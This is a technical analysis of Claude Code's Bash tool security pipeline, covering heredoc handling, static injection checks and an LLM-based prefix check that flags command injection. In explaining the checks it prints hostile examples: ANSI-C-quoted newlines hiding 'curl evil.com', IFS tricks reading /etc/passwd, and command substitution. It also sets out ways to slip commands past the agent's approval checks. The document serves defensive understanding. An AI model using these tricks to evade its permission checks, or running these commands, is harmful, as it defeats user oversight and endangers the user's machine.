# Heredoc Injection Prevention & Shell Security (Claude Code 2.1.76)

> Analysis of heredoc injection prevention, shell command parsing for security,
> injection detection, command sanitization pipeline, Bash tool security model integration,
> and edge cases.

---

## Related Symbols

> Symbol mappings:
> - [symbol_index_core_execution.md](../00_overview/symbol_index_core_execution.md) - Core execution
> - [symbol_index_core_features.md](../00_overview/symbol_index_core_features.md) - Core features
> - [symbol_index_infra_platform.md](../00_overview/symbol_index_infra_platform.md) - Platform infra
> - [symbol_index_infra_integration.md](../00_overview/symbol_index_infra_integration.md) - Integrations

Key functions in this document:
- `extractHeredocs` (XT6) - Identifies and extracts heredoc blocks from a command, replacing them with placeholders
- `restoreHeredocs` (r9z) - Restores heredoc placeholders back to original content
- `restoreHeredocsInList` (eBA) - Applies heredoc restoration to a list of parsed tokens
- `parseShellCommand` (rZ1) - Tokenizes a shell command while preserving heredocs
- `extractSubcommands` (AD) - Splits a compound command into individual subcommands
- `bashPreFlightCheck` (AYz) - LLM-based command prefix extraction for permission matching
- `runSecurityChecks` (lm) - Master security validation pipeline for bash commands
- `checkEmptyCommand` (ndY) - Passes empty commands as safe
- `checkIncompleteCommand` (rdY) - Detects fragments (starts with tab, flag, or operator)
- `checkHeredocInSubstitution` (adY) - Validates `$( cat <<DELIM ... )` patterns
- `checkQuotedHeredoc` (tdY) - Allows heredocs with quoted/escaped delimiters
- `checkGitCommitMessage` (sdY) - Special handling for git commit -m with substitution detection
- `checkJqCommand` (edY) - Detects jq `system()` and dangerous file-reading flags (**NOT** checkDangerousPatterns)
- `checkDangerousPatterns` (KcY) - Detects backticks, `$()`, `${}`, `<()`, `>()` and redirections
- `checkObfuscatedFlags` ($cY) - Detects ANSI-C quoting, locale quoting, and quoted flag names
- `checkShellMetacharacters` (AcY) - Detects `;`, `|`, `&` in quoted arguments
- `checkDangerousVariables` (qcY) - Detects variables in redirection/pipe contexts
- `checkNewlines` (YcY) - Detects newlines that could separate multiple commands
- `checkIFSInjection` (zcY) - Detects `$IFS` or `${...IFS` variable manipulation
- `checkProcEnviron` (wcY) - Detects `/proc/*/environ` access
- `checkMalformedTokenInjection` (HcY) - Detects ambiguous syntax with command separators
- `stripQuotes` (cdY) - Removes quotes from command content for deep inspection
- `stripRedirections` (ldY) - Removes safe redirect patterns before analysis
- `SECURITY_CHECK_IDS` (kH) - Enum of all security check identifiers for telemetry
- `DANGEROUS_PATTERNS` (ddY) - Array of regex patterns for dangerous shell constructs
- `HEREDOC_IN_SUBSTITUTION_PATTERN` (PhA) - Regex: `/\$\(.*<</`
- `shellTokenize` (pz) - External shell tokenizer (bash-parser)

> **Correction notice:** The original document incorrectly labeled `edY` as `checkDangerousPatterns`.
> The actual `edY` function is `checkJqCommand` (jq system() and file flag detection).
> The dangerous pattern check is `KcY`. See [implementation.md](./implementation.md) for full details.

---

## Overview

Claude Code's Bash tool is one of its most powerful and most dangerous capabilities. The LLM
generates arbitrary shell commands to execute on the user's machine. The security system must:

1. **Detect injection attacks** where the LLM (intentionally or via prompt injection) tries to
   hide malicious commands inside seemingly safe ones
2. **Parse heredocs safely** without confusing heredoc content with command syntax
3. **Extract command prefixes** for permission matching (e.g., "git commit" is allowed, "curl" is not)
4. **Handle edge cases** in shell quoting, escaping, and multi-line commands

The system uses a **two-phase approach**: fast local checks (regex + tokenizer) and a
**slow LLM-based check** (prefix extraction). Only commands that pass local checks and have a
recognized prefix are auto-approved.

---

## Security Pipeline Architecture

```
Command from LLM
       │
       ▼
┌──────────────────────────────┐
│ Phase 1: Static Security     │
│ Checks (lm / runSecurityChec│
│ ks)                          │
│                              │
│ ┌──────────────────────────┐ │
│ │ Early Allow Checks       │ │
│ │ 1. Empty command         │ │
│ │ 2. Incomplete fragment   │ │
│ │ 3. Heredoc in $()        │ │
│ │ 4. Quoted heredoc        │ │
│ │ 5. Git commit message    │ │
│ └──────────┬───────────────┘ │
│            │ passthrough     │
│ ┌──────────▼───────────────┐ │
│ │ Security Violation Checks│ │
│ │ 6. Dangerous patterns    │ │
│ │ 7. Obfuscated flags      │ │
│ │ 8. JQ system functions   │ │
│ │ 9. JQ file args          │ │
│ │ 10. Newlines             │ │
│ │ 11. IFS injection        │ │
│ │ 12. /proc/environ        │ │
│ │ 13. Shell metacharacters │ │
│ │ 14. Malformed tokens     │ │
│ └──────────┬───────────────┘ │
└────────────┼────────────────┘
             │
             ▼ "passthrough" = safe, "ask" = needs user approval
┌──────────────────────────────┐
│ Phase 2: LLM Prefix Check    │
│ (AYz / bashPreFlightCheck)   │
│                              │
│ Extracts command prefix:      │
│ "git commit" → allowed        │
│ "curl" → ask user             │
│ "command_injection_detected"  │
│ → always ask user             │
└──────────────────────────────┘
```

---

## Deep Analysis: Heredoc Extraction

### The Problem

Heredocs are multi-line string literals in bash:
```bash
cat <<EOF
This is content that should NOT be parsed as commands
rm -rf / # This is just text, not a command
EOF
```

Without heredoc awareness, the security system would:
- Tokenize `rm -rf /` as a dangerous command
- Flag `#` as a comment injection
- Misparse the multi-line structure

### extractHeredocs (XT6)

**What it does:** Identifies all heredoc blocks in a command, replaces them with unique placeholders, and returns both the processed command and a map of placeholder-to-original-content.

**How it works (step by step):**

1. **Quick check**: If the command does not contain `<<`, return immediately (no heredocs)
2. **Regex scan**: Find all heredoc operators using the pattern `<<(-)?['"]?\\?(\w+)['"]?`
   - Captures the `-` (tab-stripping) flag
   - Captures the delimiter name (e.g., `EOF`, `DELIM`)
   - Handles quoted (`'EOF'`) and escaped (`\EOF`) delimiters
3. **Filter false positives**: Skip matches inside string quotes or comments
4. **Find delimiter end**: For each heredoc, scan subsequent lines for the closing delimiter
   - If `-` flag: strip leading tabs before comparing
   - If no `-`: exact line match required
5. **Handle nesting**: Filter out heredoc operators that appear inside another heredoc's content
6. **Generate placeholders**: Each heredoc gets a unique placeholder: `__HEREDOC_{index}_{randomHex}__`
7. **Replace**: Substitute the original heredoc (operator + content + closing delimiter) with the placeholder

```javascript
// ============================================
// extractHeredocs - Extract heredoc blocks and replace with placeholders
// Location: chunks.169.mjs:1596-1678
// ============================================

// ORIGINAL (for source lookup):
function XT6(A) {
    let q = new Map;
    if (!A.includes("<<")) return { processedCommand: A, heredocs: q };
    let K = new RegExp(l9z.source, "g"), Y = [], z;
    while ((z = K.exec(A)) !== null) {
        let _ = z.index;
        if (i9z(A, _)) continue;      // Inside quotes
        if (n9z(A, _)) continue;      // In comment
        let J = z[0], X = z[1] === "-", D = z[3], j = _ + J.length,
            P = A.slice(j).indexOf("\n");
        if (P === -1) continue;
        let W = j + P, f = A.slice(W + 1).split("\n"), Z = -1;
        for (let m = 0; m < f.length; m++) {
            let b = f[m];
            if (X) { if (b.replace(/^\t*/, "") === D) { Z = m; break } }
            else if (b === D) { Z = m; break }
        }
        if (Z === -1) continue;
        // ... compute full text boundaries ...
        Y.push({ fullText: S, delimiter: D, operatorStartIndex: _, ... })
    }
    if (Y.length === 0) return { processedCommand: A, heredocs: q };
    // Filter nested heredocs, sort, generate placeholders...
    let $ = c9z();  // random hex
    w.forEach((_, J) => {
        let D = `${p9z}${X}_${$}${d9z}`;
        q.set(D, _);
        O = O.slice(0, _.operatorStartIndex) + D + O.slice(_.operatorEndIndex, ...)
    });
    return { processedCommand: O, heredocs: q }
}

// READABLE (for understanding):
function extractHeredocs(command) {
    let heredocMap = new Map;
    if (!command.includes("<<")) return { processedCommand: command, heredocs: heredocMap };

    let matches = [];
    // Find all heredoc operators (<<, <<-)
    for (let match of command.matchAll(HEREDOC_REGEX)) {
        let pos = match.index;
        if (isInsideQuotes(command, pos)) continue;
        if (isInComment(command, pos)) continue;

        let isTabStripping = match[1] === "-";
        let delimiter = match[3];
        let operatorEnd = pos + match[0].length;

        // Find the content start (next line)
        let newlinePos = command.slice(operatorEnd).indexOf("\n");
        if (newlinePos === -1) continue;
        let contentStart = operatorEnd + newlinePos;

        // Find closing delimiter
        let lines = command.slice(contentStart + 1).split("\n");
        let closingLine = -1;
        for (let i = 0; i < lines.length; i++) {
            let line = isTabStripping ? lines[i].replace(/^\t*/, "") : lines[i];
            if (line === delimiter) { closingLine = i; break; }
        }
        if (closingLine === -1) continue;  // Unclosed heredoc

        matches.push({ delimiter, operatorStartIndex: pos, contentStartIndex: contentStart, ... });
    }

    if (matches.length === 0) return { processedCommand: command, heredocs: heredocMap };

    // Filter: remove heredoc operators that appear inside another heredoc's content
    let filtered = matches.filter(m => {
        return !matches.some(other => m !== other &&
            m.operatorStartIndex > other.contentStartIndex &&
            m.operatorStartIndex < other.contentEndIndex);
    });

    // Replace each heredoc with a unique placeholder
    let randomHex = generateRandomHex();
    let processed = command;
    filtered.sort((a, b) => b.contentEndIndex - a.contentEndIndex);  // Process from end to preserve indices
    filtered.forEach((heredoc, i) => {
        let placeholder = `__HEREDOC_${filtered.length - 1 - i}_${randomHex}__`;
        heredocMap.set(placeholder, heredoc);
        processed = processed.slice(0, heredoc.operatorStartIndex) + placeholder +
                    processed.slice(heredoc.operatorEndIndex, heredoc.contentStartIndex) +
                    processed.slice(heredoc.contentEndIndex);
    });

    return { processedCommand: processed, heredocs: heredocMap };
}

// Mapping: XT6→extractHeredocs, A→command, q→heredocMap, l9z→HEREDOC_REGEX,
//   i9z→isInsideQuotes, n9z→isInComment, c9z→generateRandomHex,
//   p9z→"__HEREDOC_", d9z→"__"
```

**Why this approach:**

1. **Placeholder-based extraction** allows downstream tokenizers and security checks to operate on a "clean" command without being confused by heredoc content. The placeholders are designed to be syntactically valid identifiers (no special characters) so they do not trigger false positives in pattern matching.

2. **Reverse-order replacement** (sort by descending end position) preserves string indices during substitution. If you replace from the beginning, each replacement shifts the positions of subsequent matches.

3. **Nesting detection** handles the edge case of heredoc operators inside another heredoc's content. For example:
   ```bash
   cat <<OUTER
   This contains << but is just text
   OUTER
   ```

4. **Quote and comment awareness** (`isInsideQuotes`, `isInComment`) prevents false matching of `<<` operators inside string literals or comments.

**Key insight:** The random hex in placeholder names (`__HEREDOC_0_a3f4b2__`) prevents collision with actual command content. If a command legitimately contained `__HEREDOC_0__`, the random suffix makes accidental matches virtually impossible.

---

## Deep Analysis: Security Check Pipeline

### runSecurityChecks (lm)

**What it does:** The master function that orchestrates all security checks on a bash command. Returns either `"passthrough"` (safe), `"allow"` (explicitly safe), or `"ask"` (needs user confirmation).

**How it works:**

1. **Pre-check**: Detect single-quoted backslash bypass patterns (`CY8`)
2. **Extract base command**: The first word of the command (e.g., `git`, `npm`, `cat`)
3. **Strip quotes**: Remove single and double quotes to examine the unquoted content
4. **Build context object**: `{ originalCommand, baseCommand, unquotedContent, fullyUnquotedContent }`
5. **Run allow-list checks**: These can short-circuit with "allow" (safe to run)
6. **Run deny-list checks**: These can short-circuit with "ask" (needs user confirmation)
7. **Default**: If no check triggers, return "passthrough" (defer to prefix matching)

```javascript
// ============================================
// runSecurityChecks - Master security validation pipeline
// Location: chunks.150.mjs:321-355
// ============================================

// ORIGINAL (for source lookup):
function lm(A) {
    if (CY8(A)) return { behavior: "ask", message: "..." };
    let q = A.split(" ")[0] || "",
        { withDoubleQuotes: K, fullyUnquoted: Y } = cdY(A, q === "jq"),
        z = { originalCommand: A, baseCommand: q,
              unquotedContent: K, fullyUnquotedContent: ldY(Y) },
        w = [ndY, rdY, adY, tdY, sdY];
    for (let $ of w) {
        let O = $(z);
        if (O.behavior === "allow") return { behavior: "passthrough", message: O.decisionReason?.reason || "..." };
        if (O.behavior !== "passthrough") return O
    }
    let H = [edY, $cY, AcY, qcY, YcY, zcY, wcY, KcY, HcY];
    for (let $ of H) {
        let O = $(z);
        if (O.behavior === "ask") return O
    }
    return { behavior: "passthrough", message: "Command passed all security checks" }
}

// READABLE (for understanding):
function runSecurityChecks(command) {
    // Pre-check for backslash bypass
    if (hasSingleQuotedBackslashBypass(command))
        return { behavior: "ask", message: "Potential security bypass detected" };

    let baseCommand = command.split(" ")[0] || "";
    let { withDoubleQuotes, fullyUnquoted } = stripQuotes(command, baseCommand === "jq");
    let context = {
        originalCommand: command,
        baseCommand,
        unquotedContent: withDoubleQuotes,
        fullyUnquotedContent: stripRedirections(fullyUnquoted)
    };

    // Phase 1: Allow-list checks (can approve the command)
    let allowChecks = [checkEmpty, checkIncomplete, checkHeredocInSubst, checkQuotedHeredoc, checkGitCommit];
    for (let check of allowChecks) {
        let result = check(context);
        if (result.behavior === "allow") return { behavior: "passthrough", message: result.reason };
        if (result.behavior !== "passthrough") return result;
    }

    // Phase 2: Deny-list checks (can require user approval)
    // NOTE: edY=checkJqCommand (NOT checkDangerousPatterns), KcY=checkDangerousPatterns
    let denyChecks = [checkJqCommand, checkObfuscatedFlags, checkShellMetacharacters,
                      checkDangerousVariables, checkNewlines, checkIFSInjection,
                      checkProcEnviron, checkDangerousPatterns, checkMalformedTokenInjection];
    for (let check of denyChecks) {
        let result = check(context);
        if (result.behavior === "ask") return result;
    }

    return { behavior: "passthrough", message: "Command passed all security checks" };
}

// Mapping: lm→runSecurityChecks, CY8→hasSingleQuotedBackslashBypass, cdY→stripQuotes,
//   ldY→stripRedirections, ndY→checkEmptyCommand, rdY→checkIncompleteCommand,
//   adY→checkHeredocInSubstitution, tdY→checkQuotedHeredoc, sdY→checkGitCommitMessage,
//   edY→checkJqCommand (NOT checkDangerousPatterns!),
//   $cY→checkObfuscatedFlags, AcY→checkShellMetacharacters, qcY→checkDangerousVariables,
//   YcY→checkNewlines, zcY→checkIFSInjection, wcY→checkProcEnviron,
//   KcY→checkDangerousPatterns, HcY→checkMalformedTokenInjection
```

**Why two phases (allow then deny)?**

The allow-list runs first because some patterns that LOOK dangerous are actually safe:
- `git commit -m "$(date)"` -- the `$()` is inside a quoted commit message, which is a common and safe pattern
- `cat <<'EOF' ... EOF` -- quoted heredoc delimiters prevent variable expansion, making the content safe
- Empty commands are trivially safe

If an allow check approves the command, the deny checks are skipped entirely. This prevents false positives.

---

## Deep Analysis: Specific Security Checks

### checkHeredocInSubstitution (adY)

**What it does:** Detects the pattern `$( cat <<DELIM ... DELIM )` and allows it when the heredoc delimiter is quoted or escaped (preventing variable expansion inside the heredoc).

**How it works:**
1. Check if the command matches `HEREDOC_IN_SUBSTITUTION_PATTERN` (`/\$\(.*<</`)
2. If yes, check if the heredoc uses `cat` with a quoted delimiter (`'EOF'`) or escaped delimiter (`\EOF`)
3. If the delimiter is quoted/escaped, the content is literal -- safe to allow
4. Otherwise, fall through for further checks

**Why this matters:** The `$(cat <<'EOF' ... EOF)` pattern is Claude Code's own standard way to pass multi-line content to commands (e.g., `git commit -m "$(cat <<'EOF' ... EOF)"`). Without this allow-list entry, Claude Code would flag its own generated commands.

### checkQuotedHeredoc (tdY)

**What it does:** Allows heredocs with quoted or escaped delimiters, even outside of `$()`.

**How it works:**
1. If the command contains a heredoc inside `$()`, skip (handled by `adY`)
2. Check for `<<'DELIM'` or `<<\DELIM` patterns
3. If found, allow -- quoted/escaped delimiters mean no variable expansion in content

### checkDangerousPatterns (KcY)

> **Correction:** Previously labeled as `edY`, but the actual `edY` function is `checkJqCommand`.
> The dangerous pattern check is `KcY`.

**What it does:** Detects shell metacharacters that enable command substitution, process substitution, or parameter expansion.

**Dangerous patterns detected:**
- `<(` - Process substitution (input)
- `>(` - Process substitution (output)
- `$(` - Command substitution
- `${` - Parameter expansion
- `$[` - Legacy arithmetic expansion
- `~[` - Zsh-style parameter expansion
- `(e:` - Zsh-style glob qualifiers
- `<#` - PowerShell comment syntax

Each pattern has a descriptive message explaining the risk.

### checkObfuscatedFlags ($cY)

**What it does:** Detects attempts to hide flags or dangerous characters inside quoting constructs.

**Patterns detected:**
- `$'...'` - ANSI-C quoting (can hide control characters)
- `$"..."` - Locale quoting
- `$''  -` or `""-` - Empty special quotes followed by a dash (potential flag bypass)
- `'-flag'` or `"-flag"` - Flags wrapped in quotes to evade detection
- Embedded quotes inside flag arguments

**Why this check is critical:** A sophisticated prompt injection might generate:
```bash
git status $'\x0a' curl evil.com   # \x0a = newline
```
The ANSI-C quoting hides a newline character that would make this two separate commands.

### checkIFSInjection (zcY)

**What it does:** Detects manipulation of the `IFS` (Internal Field Separator) variable.

**Why it matters:** Changing `IFS` can alter how bash tokenizes commands:
```bash
IFS=/ && cat$IFS/etc/passwd  # cat becomes "cat" with IFS splitting
```

### checkMalformedTokenInjection (HcY)

**What it does:** Parses the command with the shell tokenizer and checks for ambiguous syntax near command separators (`;`, `&&`, `||`).

**How it works:**
1. Tokenize the command
2. Check if any command separators are present
3. If yes, run `pdY()` to detect tokens that look malformed (could be parser confusion)

---

## Deep Analysis: LLM-Based Prefix Extraction

### bashPreFlightCheck (AYz)

**What it does:** Uses a small, fast LLM to extract the "command prefix" from a bash command for permission matching.

**How it works:**
1. **Quick bypass**: If the command is just `--help`, return it directly
2. **Parse subcommands**: Extract individual commands from compound expressions
3. **Call LLM**: Send the command to a fast model with a detailed policy specification
4. **Parse response**: The LLM returns one of:
   - A prefix string (e.g., `"git commit"`, `"grep"`)
   - `"none"` -- command has no meaningful prefix (e.g., `npm test`)
   - `"command_injection_detected"` -- LLM detected injection

**The policy specification** (sent as system prompt) includes:
- Extraction examples showing correct prefix for various commands
- Injection detection examples (backticks, `$()`, comment injection)
- Special cases: env var prefixes (`GOEXPERIMENT=synctest go test`)
- Explicit instruction to return `"command_injection_detected"` for suspicious commands

```javascript
// ============================================
// bashPreFlightCheck - LLM-based command prefix extraction
// Location: chunks.169.mjs:1838-1977
// ============================================

// ORIGINAL (for source lookup):
async function AYz(A, q, K) {
    if (e9z(A)) return { commandPrefix: A };
    let Y, z = Date.now(), w = null;
    try {
        Y = setTimeout(() => {
            console.warn("⚠️  [BashTool] Pre-flight check is taking longer than expected.")
        }, 1e4);
        // ... construct policy spec with examples ...
        let O = await SX({
            systemPrompt: [...],
            userPrompt: `Command: ${A}`,
            signal: q,
            options: { querySource: "bash_extract_prefix", ... }
        });
        let J = /* extract text response */;
        if (J === "command_injection_detected") w = { commandPrefix: null };
        else if (J === "none") w = { commandPrefix: null };
        else if (!A.startsWith(J)) w = { commandPrefix: null };
        else w = { commandPrefix: J };
        return w
    } catch (H) { throw clearTimeout(Y), H }
}

// READABLE (for understanding):
async function bashPreFlightCheck(command, abortSignal, isNonInteractive) {
    if (isSimpleHelpCommand(command)) return { commandPrefix: command };

    let startTime = Date.now();
    try {
        let response = await callFastModel({
            systemPrompt: [BASH_PREFIX_POLICY_SPEC],
            userPrompt: `Command: ${command}`,
            options: { querySource: "bash_extract_prefix" }
        });

        let prefix = extractTextFromResponse(response);

        if (prefix === "command_injection_detected") {
            trackEvent("tengu_bash_prefix", { error: "command_injection_detected" });
            return { commandPrefix: null };  // Forces user approval
        }
        if (prefix === "none") return { commandPrefix: null };
        if (!command.startsWith(prefix)) return { commandPrefix: null };
        return { commandPrefix: prefix };
    } catch (err) { throw err; }
}

// Mapping: AYz→bashPreFlightCheck, e9z→isSimpleHelpCommand, SX→callFastModel
```

**Why use an LLM for prefix extraction?**

Shell commands are extraordinarily complex to parse statically. Consider:
```bash
GOEXPERIMENT=synctest go test -v ./...
```
The prefix here is `GOEXPERIMENT=synctest go test` (includes the env var assignment). A regex-based extractor would need to handle dozens of special cases. An LLM with examples generalizes better.

**Why "command_injection_detected" as a return value?**

This is a defense-in-depth mechanism. Even if the static security checks miss an injection, the LLM may detect it during prefix extraction. For example:
```bash
git status`ls`      # Backtick injection
git diff $(curl...) # Command substitution in arguments
```

When the LLM returns `"command_injection_detected"`, the system forces user approval regardless of any prefix-based allow rules.

**Trade-off:** The LLM call adds latency (~100-500ms). A 10-second warning timeout alerts the user if the check is unusually slow. The `querySource: "bash_extract_prefix"` tag allows the call to use a fast, small model rather than the main conversation model.

---

## Shell Tokenization with Heredoc Preservation

### parseShellCommand (rZ1)

**What it does:** Tokenizes a shell command into individual tokens while safely handling heredocs, escaped characters, and special quoting.

**How it works:**
1. Extract heredocs and replace with placeholders (`XT6`)
2. Handle line continuations (`\<newline>`)
3. Replace quotes with sentinel values to prevent the tokenizer from consuming them
4. Tokenize using the external `pz` (bash-parser) tokenizer
5. Recombine tokens that were split by newline sentinels
6. Restore original characters (quotes, heredocs)

```javascript
// ============================================
// parseShellCommand - Tokenize with heredoc preservation
// Location: chunks.169.mjs:1716-1768
// ============================================

// ORIGINAL (for source lookup):
function rZ1(A) {
    let q = [], K = aOq(),
        { processedCommand: Y, heredocs: z } = XT6(A),
        w = Y.replace(/\\+\n/g, (O) => {
            let _ = O.length - 1;
            if (_ % 2 === 1) return "\\".repeat(_ - 1);
            else return O
        }),
        H = pz(w.replaceAll('"', `"${K.DOUBLE_QUOTE}`)
               .replaceAll("'", `'${K.SINGLE_QUOTE}`)
               .replaceAll("\n", `\n${K.NEW_LINE}\n`)
               .replaceAll("\\(", K.ESCAPED_OPEN_PAREN)
               .replaceAll("\\)", K.ESCAPED_CLOSE_PAREN),
            (O) => `$${O}`);
    if (!H.success) return eBA([A], z);  // Fallback: return original command
    // ... recombine and restore ...
    return eBA(_, z)
}

// READABLE (for understanding):
function parseShellCommand(command) {
    let tokens = [];
    let sentinels = generateSentinels();  // Random hex to avoid collisions
    let { processedCommand, heredocs } = extractHeredocs(command);

    // Handle line continuations (backslash-newline)
    let normalized = processedCommand.replace(/\\+\n/g, continuation => {
        let backslashCount = continuation.length - 1;
        if (backslashCount % 2 === 1) return "\\".repeat(backslashCount - 1);
        else return continuation;
    });

    // Replace quotes with sentinels so tokenizer doesn't consume them
    let prepared = normalized
        .replaceAll('"', `"${sentinels.DOUBLE_QUOTE}`)
        .replaceAll("'", `'${sentinels.SINGLE_QUOTE}`)
        .replaceAll("\n", `\n${sentinels.NEW_LINE}\n`)
        .replaceAll("\\(", sentinels.ESCAPED_OPEN_PAREN)
        .replaceAll("\\)", sentinels.ESCAPED_CLOSE_PAREN);

    let parsed = shellTokenize(prepared, v => `$${v}`);
    if (!parsed.success) return restoreHeredocsInList([command], heredocs);

    // Recombine tokens split by newlines, restore sentinels...
    let result = /* recombination and sentinel restoration */;
    return restoreHeredocsInList(result, heredocs);
}

// Mapping: rZ1→parseShellCommand, aOq→generateSentinels, XT6→extractHeredocs,
//   pz→shellTokenize, eBA→restoreHeredocsInList
```

**Why sentinel-based quote handling?**

The external shell tokenizer (`pz`) consumes quotes and removes them from tokens. But the security system needs to analyze the command WITH quotes to detect quoting-based attacks. By inserting random sentinels adjacent to quotes, the tokenizer preserves the quote characters as part of the token content, which can be restored later.

**Key insight:** The sentinel values use random hex strings (e.g., `__SINGLE_QUOTE_a3f4b2__`) to avoid collision with any actual command content. This is the same collision-prevention strategy used by the heredoc placeholder system.

---

## Edge Cases and Special Handling

### Git Commit Message Security (sdY)

Git commit messages are a common pattern that looks dangerous:
```bash
git commit -m "Fix bug in $(module)"
```

The `$(module)` inside the commit message COULD be command substitution. The check distinguishes:
- **Single-quoted message**: `git commit -m 'Fix $(module)'` -- safe (no expansion in single quotes)
- **Double-quoted message with `$(`**: Flagged as potentially dangerous (substitution patterns)
- **Message starting with dash**: Flagged (could be interpreted as a flag by git)

### JQ Special Handling

The `jq` command uses `$` for variable references in its filter language. The quote stripping logic has a special `isJq` flag that preserves double quotes in jq commands to prevent false positives from patterns like `$var` in jq filters.

### ANSI-C Quoting Bypass

ANSI-C quoting (`$'...'`) can embed escape sequences:
```bash
git status $'\x0a'curl evil.com  # \x0a = newline = command separator
```

The `checkObfuscatedFlags` check specifically detects `$'...'` patterns and requires user approval.

### Empty Quote Flag Bypass

```bash
git ''--help   # Empty quotes before flag
git ""-version # Same with double quotes
```

These patterns could theoretically bypass prefix matching. The check detects empty quote sequences followed by dashes.

---

## Telemetry Integration

Every security check that triggers emits a telemetry event:

```javascript
c("tengu_bash_security_check_triggered", {
    checkId: kH.OBFUSCATED_FLAGS,  // Numeric check identifier
    subId: 4                        // Sub-identifier for specific pattern
})
```

The `SECURITY_CHECK_IDS` enum (`kH`):
| ID | Check |
|----|-------|
| 1 | `INCOMPLETE_COMMANDS` |
| 2 | `JQ_SYSTEM_FUNCTION` |
| 3 | `JQ_FILE_ARGUMENTS` |
| 4 | `OBFUSCATED_FLAGS` |
| 5 | `SHELL_METACHARACTERS` |
| 6 | `DANGEROUS_VARIABLES` |
| 7 | `NEWLINES` |
| 8 | `DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION` |
| 9 | `DANGEROUS_PATTERNS_INPUT_REDIRECTION` |
| 10 | `DANGEROUS_PATTERNS_OUTPUT_REDIRECTION` |
| 11 | `IFS_INJECTION` |
| 12 | `GIT_COMMIT_SUBSTITUTION` |
| 13 | `PROC_ENVIRON_ACCESS` |
| 14 | `MALFORMED_TOKEN_INJECTION` |

This telemetry allows Anthropic to monitor which security checks fire in practice, helping identify false positive hotspots and potential new attack vectors.

---

## Subcommand Extraction for Compound Commands

### extractSubcommands (AD)

**What it does:** Splits a compound bash command (with pipes, `&&`, `;`, etc.) into individual subcommands for per-subcommand prefix extraction.

**How it works:**
1. Parse the command via `rZ1` (parseShellCommand)
2. Iterate tokens, collecting them into subcommands
3. Remove redirect operators (`>`, `>>`, `>&`) and their targets
4. Remove shell-internal tokens (assignment operators, etc.)
5. Return the list of individual subcommands

**Why per-subcommand analysis?** A compound command like:
```bash
npm test && git push
```
Has prefix `npm test` for the first part and `git push` for the second. Each subcommand needs its own prefix extraction and permission check.

---

## Summary of Design Decisions

| Decision | Rationale |
|----------|-----------|
| Two-phase pipeline (static + LLM) | Fast local checks for common cases; LLM for complex parsing |
| Heredoc placeholder extraction | Prevents heredoc content from triggering false positives |
| Random hex in placeholders | Prevents collision with actual command content |
| Allow-list before deny-list | Common safe patterns (heredocs, git commit) bypass expensive checks |
| LLM prefix extraction | Shell syntax too complex for pure regex; LLM generalizes better |
| "command_injection_detected" | Defense-in-depth; LLM catch for attacks that pass static checks |
| Per-check telemetry | Monitor false positive rates and discover new attack patterns |
| Sentinel-based quote preservation | Tokenizer transparency; security system sees original quoting |
| ANSI-C quoting detection | Prevents escape-sequence-based command injection |
| IFS injection detection | Prevents field-separator manipulation attacks |
